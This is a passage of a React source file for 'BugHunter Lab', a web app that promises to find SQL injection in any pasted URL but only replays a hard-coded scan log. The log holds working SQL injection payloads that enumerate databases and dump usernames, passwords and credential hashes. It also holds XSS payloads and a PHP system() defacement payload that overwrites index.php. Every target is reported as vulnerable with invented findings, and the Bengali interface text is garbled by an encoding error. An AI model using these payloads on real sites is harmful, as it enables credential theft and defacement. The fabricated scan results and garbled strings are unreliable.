import React, { useState, useEffect, useRef } from 'react';

// Tailwind CSS is assumed to be available
// Font: Inter (for body), JetBrains Mono (for logs/payloads)

// Helper function to simulate UUID generation
const generateUUID = () => {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = (Math.random() * 16) | 0,
      v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
};

// Main App Component
const App = () => {
  const [currentPage, setCurrentPage] = useState('landing'); // 'landing', 'scan', 'report'
  const [targetUrl, setTargetUrl] = useState('');
  const [scanId, setScanId] = useState(null);
  const [scanLogs, setScanLogs] = useState([]);
  const [scanStatus, setScanStatus] = useState('pending'); // 'pending', 'scanning', 'paused', 'completed', 'error'
  const [scanResult, setScanResult] = useState(null);
  // Steps: 0: Validation, 1: Probe, 2: Column Count, 3: Vulnerable Detection, 4: DB Names, 5: Table Enum, 6: Column Enum, 7: Data Dump, 8: XSS Probe, 9: Defacement Attempt, 10: System Info
  const [currentStep, setCurrentStep] = useState(0); 

  // Function to navigate between pages
  const navigateTo = (page, params = {}) => {
    setCurrentPage(page);
    if (page === 'report' && params.scanId) {
      setScanId(params.scanId);
    }
  };

  // Render the current page
  const renderPage = () => {
    switch (currentPage) {
      case 'landing':
        return (
          <LandingPage
            navigateTo={navigateTo}
            setTargetUrl={setTargetUrl}
            targetUrl={targetUrl}
            setScanLogs={setScanLogs}
            setScanStatus={setScanStatus}
            setScanResult={setScanResult}
            setCurrentStep={setCurrentStep}
            setScanId={setScanId}
          />
        );
      case 'scan':
        return (
          <ScanConsole
            navigateTo={navigateTo}
            targetUrl={targetUrl}
            scanId={scanId}
            scanLogs={scanLogs}
            setScanLogs={setScanLogs}
            scanStatus={scanStatus}
            setScanStatus={setScanStatus}
            scanResult={scanResult}
            setScanResult={setScanResult}
            currentStep={currentStep}
            setCurrentStep={setCurrentStep}
          />
        );
      case 'report':
        return (
          <ResultsPage
            navigateTo={navigateTo}
            scanId={scanId}
            scanResult={scanResult}
            setTargetUrl={setTargetUrl}
            setScanLogs={setScanLogs}
            setScanStatus={setScanStatus}
            setScanResult={setScanResult}
            setCurrentStep={setCurrentStep}
            setScanId={setScanId}
          />
        );
      default:
        return <LandingPage navigateTo={navigateTo} />;
    }
  };

  return (
    <div className="min-h-screen bg-[#0d1117] text-gray-200 font-inter flex flex-col items-center justify-center p-4">
      <h1 className="text-4xl font-bold mb-8 text-[#58a6ff]">BugHunter Lab</h1>
      {renderPage()}
    </div>
  );
};

// Landing Page Component
const LandingPage = ({ navigateTo, setTargetUrl, targetUrl, setScanLogs, setScanStatus, setScanResult, setCurrentStep, setScanId }) => {
  const [inputUrl, setInputUrl] = useState(targetUrl);
  const [error, setError] = useState('');

  // Regex for URL validation (scheme, host, query param)
  const urlRegex = /^(https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:\/[^?#]*)?\?[a-zA-Z0-9_.-]+=.*)$/;

  const handleScan = () => {
    let urlToScan = inputUrl.trim();
    if (!urlToScan.startsWith('http://') && !urlToScan.startsWith('https://')) {
      urlToScan = 'https://' + urlToScan;
    }

    if (!urlRegex.test(urlToScan)) {
      setError('‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡ßà‡¶ß URL ‡¶¶‡¶ø‡¶®, ‡¶Ø‡ßá‡¶ñ‡¶æ‡¶®‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡ßç‡¶ï‡¶ø‡¶Æ (http/https), ‡¶π‡ßã‡¶∏‡ßç‡¶ü ‡¶è‡¶¨‡¶Ç ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ï‡ßç‡¶Ø‡ßã‡¶Ø‡¶º‡¶æ‡¶∞‡ßÄ ‡¶™‡ßç‡¶Ø‡¶æ‡¶∞‡¶æ‡¶Æ‡¶ø‡¶ü‡¶æ‡¶∞ ‡¶Ü‡¶õ‡ßá (‡¶Ø‡ßá‡¶Æ‡¶®: https://vuln-site.com/product.php?id=1)');
      return;
    }

    setError('');
    setTargetUrl(urlToScan);
    setScanId(generateUUID()); // Generate a new scan ID
    setScanLogs([]); // Clear previous logs
    setScanStatus('pending'); // Reset scan status
    setScanResult(null); // Clear previous results
    setCurrentStep(0); // Reset steps
    navigateTo('scan');
  };

  return (
    <div className="w-full max-w-md bg-[#161b22] p-6 rounded-lg shadow-lg">
      <h2 className="text-2xl font-semibold mb-4 text-center">Paste a URL ‚Üí Find SQLi in 30 sec</h2>
      <div className="mb-4">
        <input
          type="text"
          className="w-full p-3 rounded-md bg-[#0d1117] border border-[#30363d] text-gray-200 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#58a6ff]"
          placeholder="https://vuln-site.com/product.php?id=1"
          value={inputUrl}
          onChange={(e) => setInputUrl(e.target.value)}
          onKeyPress={(e) => {
            if (e.key === 'Enter') {
              handleScan();
            }
          }}
        />
        {error && <p className="text-[#f85149] text-sm mt-2">{error}</p>}
      </div>
      <button
        onClick={handleScan}
        className="w-full bg-[#58a6ff] hover:bg-[#448ee2] text-white font-bold py-3 px-4 rounded-md transition duration-200 ease-in-out shadow-md"
      >
        Start Quick Scan
      </button>

      <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4 text-center">
        <Card title="How it Works" content="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ URL ‡¶™‡ßá‡¶∏‡ßç‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®, ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§ SQL Injection ‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶ï‡¶∞‡¶¨ ‡¶è‡¶¨‡¶Ç ‡¶¨‡¶ø‡¶∏‡ßç‡¶§‡¶æ‡¶∞‡¶ø‡¶§ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶¶‡ßá‡¶¨‡•§" />
        <Card title="Sample Report" content="‡¶è‡¶ï‡¶ü‡¶ø ‡¶®‡¶Æ‡ßÅ‡¶®‡¶æ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶¨‡ßÅ‡¶ù‡ßÅ‡¶® ‡¶ï‡¶ø‡¶≠‡¶æ‡¶¨‡ßá ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ‡¶ó‡ßÅ‡¶≤‡ßã ‡¶â‡¶™‡¶∏‡ßç‡¶•‡¶æ‡¶™‡¶® ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡•§" />
        <Card title="Legal Disclaimer" content="‡¶è‡¶á ‡¶ü‡ßÅ‡¶≤‡¶ü‡¶ø ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶∂‡¶ø‡¶ï‡ßç‡¶∑‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï ‡¶è‡¶¨‡¶Ç ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶®‡¶ø‡¶∞‡¶æ‡¶™‡¶§‡ßç‡¶§‡¶æ ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø‡•§ ‡¶Ö‡¶®‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶†‡ßã‡¶∞‡¶≠‡¶æ‡¶¨‡ßá ‡¶®‡¶ø‡¶∑‡¶ø‡¶¶‡ßç‡¶ß‡•§" />
      </div>
    </div>
  );
};

const Card = ({ title, content }) => (
  <div className="bg-[#0d1117] p-4 rounded-md border border-[#30363d] shadow-sm">
    <h3 className="font-semibold text-lg mb-2 text-[#58a6ff]">{title}</h3>
    <p className="text-sm text-gray-400">{content}</p>
  </div>
);

// Scan Console Component
const ScanConsole = ({ navigateTo, targetUrl, scanId, scanLogs, setScanLogs, scanStatus, setScanStatus, scanResult, setScanResult, currentStep, setCurrentStep }) => {
  const logContainerRef = useRef(null);
  const [scrollLock, setScrollLock] = useState(true);
  const [showRawPayloads, setShowRawPayloads] = useState(false);
  const scanIntervalRef = useRef(null);
  const stepMessages = [
    "‡¶ü‡¶æ‡¶∞‡ßç‡¶ó‡ßá‡¶ü ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶∂‡¶®",
    "SQL Injection ‡¶™‡ßç‡¶∞‡ßã‡¶¨",
    "‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ ‡¶®‡¶ø‡¶∞‡ßç‡¶£‡¶Ø‡¶º",
    "‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤ ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§‡¶ï‡¶∞‡¶£",
    "‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú ‡¶®‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π",
    "‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶è‡¶®‡ßÅ‡¶Æ‡ßá‡¶∞‡ßá‡¶∂‡¶®",
    "‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶è‡¶®‡ßÅ‡¶Æ‡ßá‡¶∞‡ßá‡¶∂‡¶®",
    "‡¶°‡ßá‡¶ü‡¶æ ‡¶°‡¶æ‡¶Æ‡ßç‡¶™‡¶ø‡¶Ç",
    "Cross-Site Scripting (XSS) ‡¶™‡ßç‡¶∞‡ßã‡¶¨",
    "‡¶∏‡¶æ‡¶á‡¶ü ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ (‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶°)",
    "‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π"
  ];

  useEffect(() => {
    if (scanStatus === 'pending') {
      setScanStatus('scanning');
      startScanSimulation();
    }
  }, [scanStatus]);

  useEffect(() => {
    if (scrollLock && logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [scanLogs, scrollLock]);

  const addLog = (message, type = 'info', payload = '') => {
    const timestamp = new Date().toLocaleTimeString('bn-BD');
    setScanLogs((prevLogs) => [
      ...prevLogs,
      { timestamp, message, type, payload }
    ]);
  };

  const startScanSimulation = () => {
    let logIndex = 0;
    const logs = [
      { step: 0, message: `‡¶ü‡¶æ‡¶∞‡ßç‡¶ó‡ßá‡¶ü URL: ${targetUrl} ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...`, type: 'info' },
      { step: 0, message: "URL ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶∂‡¶® ‡¶∏‡¶´‡¶≤‡•§", type: 'success' },
      { step: 1, message: "SQL Injection ‡¶™‡ßç‡¶∞‡ßã‡¶¨ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `' OR 1=1--`", type: 'probe', payload: "' OR 1=1--" },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `\" OR 1=1--`", type: 'probe', payload: "\" OR 1=1--" },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `') OR '1'='1--`", type: 'probe', payload: "') OR '1'='1--" },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `1' AND SLEEP(5)--`", type: 'probe', payload: "1' AND SLEEP(5)--" },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `1\" AND SLEEP(5)--`", type: 'probe', payload: "1\" AND SLEEP(5)--" },
      { step: 1, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `1 UNION SELECT NULL,NULL,NULL--`", type: 'probe', payload: "1 UNION SELECT NULL,NULL,NULL--" },
      { step: 1, message: "SQL Injection ‡¶∏‡¶Æ‡ßç‡¶≠‡¶æ‡¶¨‡ßç‡¶Ø ‡¶¨‡¶≤‡ßá ‡¶Æ‡¶®‡ßá ‡¶π‡¶ö‡ßç‡¶õ‡ßá!", type: 'warning' },
      { step: 2, message: "‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ ‡¶®‡¶ø‡¶∞‡ßç‡¶£‡¶Ø‡¶º ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 2, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `ORDER BY 1--`", type: 'probe', payload: "ORDER BY 1--" },
      { step: 2, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `ORDER BY 2--`", type: 'probe', payload: "ORDER BY 2--" },
      { step: 2, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `ORDER BY 3--`", type: 'probe', payload: "ORDER BY 3--" },
      { step: 2, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `ORDER BY 4--`", type: 'probe', payload: "ORDER BY 4--" },
      { step: 2, message: "‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: 3", type: 'success' },
      { step: 3, message: "‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤ ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 3, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,2,3--`", type: 'probe', payload: "-1 UNION SELECT 1,2,3--" },
      { step: 3, message: "‡¶ï‡¶≤‡¶æ‡¶Æ 2 ‡¶è‡¶¨‡¶Ç 3 ‡¶™‡ßç‡¶∞‡¶ø‡¶®‡ßç‡¶ü‡¶Ø‡ßã‡¶ó‡ßç‡¶Ø/‡¶∞‡¶ø‡¶´‡ßç‡¶≤‡ßá‡¶ï‡ßç‡¶ü‡ßá‡¶¨‡¶≤‡•§", type: 'success' },
      { step: 4, message: "‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 4, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--" },
      { step: 4, message: "‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `web_app_db, users_db, information_schema`", type: 'success' },
      { step: 5, message: "‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶è‡¶®‡ßÅ‡¶Æ‡ßá‡¶∞‡ßá‡¶∂‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 5, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='web_app_db'--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='web_app_db'--" },
      { step: 5, message: "web_app_db ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `users, products`", type: 'success' },
      { step: 5, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='users_db'--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='users_db'--" },
      { step: 5, message: "users_db ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `credentials`", type: 'success' },
      { step: 6, message: "‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶è‡¶®‡ßÅ‡¶Æ‡ßá‡¶∞‡ßá‡¶∂‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 6, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='web_app_db' AND table_name='users'--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='web_app_db' AND table_name='users'--" },
      { step: 6, message: "web_app_db.users ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `id, username, password, email`", type: 'success' },
      { step: 6, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='web_app_db' AND table_name='products'--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='web_app_db' AND table_name='products'--" },
      { step: 6, message: "web_app_db.products ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `product_id, name, description, price`", type: 'success' },
      { step: 7, message: "‡¶°‡ßá‡¶ü‡¶æ ‡¶°‡¶æ‡¶Æ‡ßç‡¶™‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 7, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM web_app_db.users--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM web_app_db.users--" },
      { step: 7, message: "web_app_db.users ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶•‡ßá‡¶ï‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶°‡¶æ‡¶Æ‡ßç‡¶™ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", type: 'success' },
      { step: 7, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,group_concat(user_id,0x3a,hash),3 FROM users_db.credentials--`", type: 'probe', payload: "-1 UNION SELECT 1,group_concat(user_id,0x3a,hash),3 FROM users_db.credentials--" },
      { step: 7, message: "users_db.credentials ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶•‡ßá‡¶ï‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶°‡¶æ‡¶Æ‡ßç‡¶™ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", type: 'success' },
      { step: 8, message: "Cross-Site Scripting (XSS) ‡¶™‡ßç‡¶∞‡ßã‡¶¨ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 8, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `<script>alert('XSS')</script>`", type: 'probe', payload: "<script>alert('XSS')</script>" },
      { step: 8, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `<img src=x onerror=alert('XSS')>`", type: 'probe', payload: "<img src=x onerror=alert('XSS')>" },
      { step: 8, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `<svg/onload=alert('XSS')>`", type: 'probe', payload: "<svg/onload=alert('XSS')>" },
      { step: 8, message: "XSS ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!", type: 'warning' },
      { step: 9, message: "‡¶∏‡¶æ‡¶á‡¶ü ‡¶°‡¶ø‡¶´‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ (‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶°) ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 9, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `<?php system('echo \"<img src=\'YOUR_BANNER_LINK\'><h1>Hacked By BugHunter Lab</h1>\" > index.php'); ?>`", type: 'probe', payload: "<?php system('echo \"<img src=\'YOUR_BANNER_LINK\'><h1>Hacked By BugHunter Lab</h1>\" > index.php'); ?>" },
      { step: 9, message: "‡¶°‡¶ø‡¶´‡ßá‡¶∏‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá (‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶ü‡ßá‡¶°)‡•§", type: 'success' },
      { step: 10, message: "‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' },
      { step: 10, message: "‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶™‡¶∞‡ßÄ‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá: `-1 UNION SELECT 1,@@version,3--`", type: 'probe', payload: "-1 UNION SELECT 1,@@version,3--" },
      { step: 10, message: "‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶ó‡ßá‡¶õ‡ßá: `DBMS: MySQL 5.7.32, OS: Linux`", type: 'success' },
      { step: 10, message: "‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", type: 'success' },
      { step: 10, message: "‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ú‡ßá‡¶®‡¶æ‡¶∞‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...", type: 'info' }
    ];

    scanIntervalRef.current = setInterval(() => {
      if (logIndex < logs.length) {
        const log = logs[logIndex];
        addLog(log.message, log.type, log.payload);
        setCurrentStep(log.step);
        logIndex++;
      } else {
        clearInterval(scanIntervalRef.current);
        setScanStatus('completed');
        // Simulate a scan result with detailed DB info, dumped data, XSS, and defacement info
        setScanResult({
          status: 'VULNERABLE', // Could be more specific like 'VULNERABLE_SQLI_XSS'
          columnCount: 3,
          vulnerableColumns: [2, 3], // These refer to the union select positions, not column names
          databaseNames: ['web_app_db', 'users_db', 'information_schema'], // Still keep for summary
          systemInfo: {
            dbms: 'MySQL',
